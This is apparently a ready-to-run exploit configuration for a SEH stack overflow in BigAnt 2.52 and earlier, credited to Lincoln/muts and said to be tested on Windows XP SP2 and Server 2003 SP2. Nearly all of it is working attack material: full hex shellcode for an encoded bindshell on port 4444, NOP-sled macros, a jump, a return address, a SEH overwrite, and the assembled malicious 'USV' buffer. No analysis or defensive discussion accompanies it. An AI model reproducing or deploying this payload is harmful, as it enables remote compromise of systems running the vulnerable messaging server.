# BigAnt <= 2.52 SEH overflow

# Discovered with the following parameters by Lincoln
#SEQUENCE=A
#SEQSTEP=900
#MAXSEQLEN=4500
#
# The test case was:
#USV FUZZ
#--


# exploit by Lincoln/muts/r-e team
# tested on XPSP2 & Win2k3 SP2

#Bindshell on port 4444
#Msf::Encoder::PexAlphaNum with final size of 709 bytes
!SHELL_CODE=0xeb 0x03 0x59 0xeb 0x05 0xe8 0xf8 0xff 0xff 0xff 0x4f 0x49 0x49 0x49 0x49 0x49 0x49 0x51 0x5a 0x56 0x54 0x58 0x36 0x33 0x30 0x56 0x58 0x34 0x41 0x30 0x42 0x36 0x48 0x48 0x30 0x42 0x33 0x30 0x42 0x43 0x56 0x58 0x32 0x42 0x44 0x42 0x48 0x34 0x41 0x32 0x41 0x44 0x30 0x41 0x44 0x54 0x42 0x44 0x51 0x42 0x30 0x41 0x44 0x41 0x56 0x58 0x34 0x5a 0x38 0x42 0x44 0x4a 0x4f 0x4d 0x4e 0x4f 0x4c 0x46 0x4b 0x4e 0x4d 0x54 0x4a 0x4e 0x49 0x4f 0x4f 0x4f 0x4f 0x4f 0x4f 0x4f 0x42 0x46 0x4b 0x48 0x4e 0x46 0x46 0x32 0x46 0x42 0x4b 0x58 0x45 0x34 0x4e 0x43 0x4b 0x38 0x4e 0x37 0x45 0x50 0x4a 0x37 0x41 0x30 0x4f 0x4e 0x4b 0x58 0x4f 0x34 0x4a 0x31 0x4b 0x48 0x4f 0x35 0x42 0x52 0x41 0x50 0x4b 0x4e 0x49 0x34 0x4b 0x38 0x46 0x53 0x4b 0x38 0x41 0x30 0x50 0x4e 0x41 0x53 0x42 0x4c 0x49 0x39 0x4e 0x4a 0x46 0x38 0x42 0x4c 0x46 0x37 0x47 0x50 0x41 0x4c 0x4c 0x4c 0x4d 0x50 0x41 0x50 0x44 0x4c 0x4b 0x4e 0x46 0x4f 0x4b 0x33 0x46 0x35 0x46 0x42 0x4a 0x42 0x45 0x37 0x45 0x4e 0x4b 0x58 0x4f 0x45 0x46 0x32 0x41 0x50 0x4b 0x4e 0x48 0x56 0x4b 0x58 0x4e 0x30 0x4b 0x54 0x4b 0x58 0x4f 0x35 0x4e 0x51 0x41 0x30 0x4b 0x4e 0x43 0x50 0x4e 0x52 0x4b 0x38 0x49 0x58 0x4e 0x56 0x46 0x42 0x4e 0x41 0x41 0x46 0x43 0x4c 0x41 0x33 0x4b 0x4d 0x46 0x56 0x4b 0x38 0x43 0x44 0x42 0x33 0x4b 0x48 0x42 0x54 0x4e 0x30 0x4b 0x48 0x42 0x57 0x4e 0x31 0x4d 0x4a 0x4b 0x38 0x42 0x34 0x4a 0x30 0x50 0x35 0x4a 0x36 0x50 0x48 0x50 0x44 0x50 0x50 0x4e 0x4e 0x42 0x55 0x4f 0x4f 0x48 0x4d 0x48 0x56 0x43 0x55 0x48 0x46 0x4a 0x46 0x43 0x53 0x44 0x43 0x4a 0x36 0x47 0x37 0x43 0x47 0x44 0x33 0x4f 0x35 0x46 0x35 0x4f 0x4f 0x42 0x4d 0x4a 0x36 0x4b 0x4c 0x4d 0x4e 0x4e 0x4f 0x4b 0x53 0x42 0x55 0x4f 0x4f 0x48 0x4d 0x4f 0x55 0x49 0x48 0x45 0x4e 0x48 0x56 0x41 0x58 0x4d 0x4e 0x4a 0x50 0x44 0x50 0x45 0x35 0x4c 0x46 0x44 0x30 0x4f 0x4f 0x42 0x4d 0x4a 0x46 0x49 0x4d 0x49 0x30 0x45 0x4f 0x4d 0x4a 0x47 0x45 0x4f 0x4f 0x48 0x4d 0x43 0x35 0x43 0x45 0x43 0x35 0x43 0x55 0x43 0x55 0x43 0x34 0x43 0x45 0x43 0x34 0x43 0x55 0x4f 0x4f 0x42 0x4d 0x48 0x56 0x4a 0x46 0x41 0x41 0x4e 0x45 0x48 0x36 0x43 0x55 0x49 0x38 0x41 0x4e 0x45 0x59 0x4a 0x46 0x46 0x4a 0x4c 0x41 0x42 0x57 0x47 0x4c 0x47 0x35 0x4f 0x4f 0x48 0x4d 0x4c 0x56 0x42 0x41 0x41 0x55 0x45 0x55 0x4f 0x4f 0x42 0x4d 0x4a 0x46 0x46 0x4a 0x4d 0x4a 0x50 0x52 0x49 0x4e 0x47 0x45 0x4f 0x4f 0x48 0x4d 0x43 0x35 0x45 0x45 0x4f 0x4f 0x42 0x4d 0x4a 0x36 0x45 0x4e 0x49 0x44 0x48 0x48 0x49 0x44 0x47 0x45 0x4f 0x4f 0x48 0x4d 0x42 0x35 0x46 0x35 0x46 0x45 0x45 0x45 0x4f 0x4f 0x42 0x4d 0x43 0x59 0x4a 0x56 0x47 0x4e 0x49 0x37 0x48 0x4c 0x49 0x37 0x47 0x45 0x4f 0x4f 0x48 0x4d 0x45 0x35 0x4f 0x4f 0x42 0x4d 0x48 0x56 0x4c 0x56 0x46 0x36 0x48 0x36 0x4a 0x36 0x43 0x56 0x4d 0x56 0x49 0x58 0x45 0x4e 0x4c 0x36 0x42 0x35 0x49 0x45 0x49 0x52 0x4e 0x4c 0x49 0x58 0x47 0x4e 0x4c 0x36 0x46 0x34 0x49 0x38 0x44 0x4e 0x41 0x43 0x42 0x4c 0x43 0x4f 0x4c 0x4a 0x50 0x4f 0x44 0x34 0x4d 0x52 0x50 0x4f 0x44 0x54 0x4e 0x32 0x43 0x49 0x4d 0x58 0x4c 0x57 0x4a 0x43 0x4b 0x4a 0x4b 0x4a 0x4b 0x4a 0x4a 0x46 0x44 0x47 0x50 0x4f 0x43 0x4b 0x48 0x31 0x4f 0x4f 0x45 0x57 0x46 0x44 0x4f 0x4f 0x48 0x4d 0x4b 0x55 0x47 0x45 0x44 0x45 0x41 0x45 0x41 0x35 0x41 0x55 0x4c 0x36 0x41 0x30 0x41 0x45 0x41 0x45 0x45 0x35 0x41 0x35 0x4f 0x4f 0x42 0x4d 0x4a 0x46 0x4d 0x4a 0x49 0x4d 0x45 0x50 0x50 0x4c 0x43 0x45 0x4f 0x4f 0x48 0x4d 0x4c 0x46 0x4f 0x4f 0x4f 0x4f 0x47 0x53 0x4f 0x4f 0x42 0x4d 0x4b 0x38 0x47 0x55 0x4e 0x4f 0x43 0x48 0x46 0x4c 0x46 0x46 0x4f 0x4f 0x48 0x4d 0x44 0x55 0x4f 0x4f 0x42 0x4d 0x4a 0x46 0x42 0x4f 0x4c 0x58 0x46 0x50 0x4f 0x45 0x43 0x55 0x4f 0x4f 0x48 0x4d 0x4f 0x4f 0x42 0x4d 0x5a

#For building the noop sled
!INTEL_32_NOOP=0x90
$FIVE_NOOPS=INTEL_32_NOOPINTEL_32_NOOPINTEL_32_NOOPINTEL_32_NOOPINTEL_32_NOOP
$TEN_NOOPS=FIVE_NOOPSFIVE_NOOPS
$THIRTY_NOOPS=TEN_NOOPSTEN_NOOPSTEN_NOOPS
$ONE_HUNDRED_NOOPS=THIRTY_NOOPSTHIRTY_NOOPSTHIRTY_NOOPSTEN_NOOPS

#JMP + 6
!SHORT_JUMP=0xeb069090

#Return Code
!RETURN=0x95329a0f

#SEH
!SEH=0xe97cfcffff

#CRLF
!CRLF=0x0a 0x0d

#FINAL BUFFER
$USV_0DAY=USV ONE_HUNDRED_NOOPSONE_HUNDRED_NOOPSTEN_NOOPSFIVE_NOOPSINTEL_32_NOOPINTEL_32_NOOPINTEL_32_NOOPSHELL_CODETHIRTY_NOOPSFIVE_NOOPSSHORT_JUMPRETURNTEN_NOOPSSEHONE_HUNDRED_NOOPSONE_HUNDRED_NOOPSONE_HUNDRED_NOOPSONE_HUNDRED_NOOPSONE_HUNDRED_NOOPSONE_HUNDRED_NOOPSTHIRTY_NOOPSTEN_NOOPSTEN_NOOPSCRLFCRLF
endcfg
USV_0DAY
--
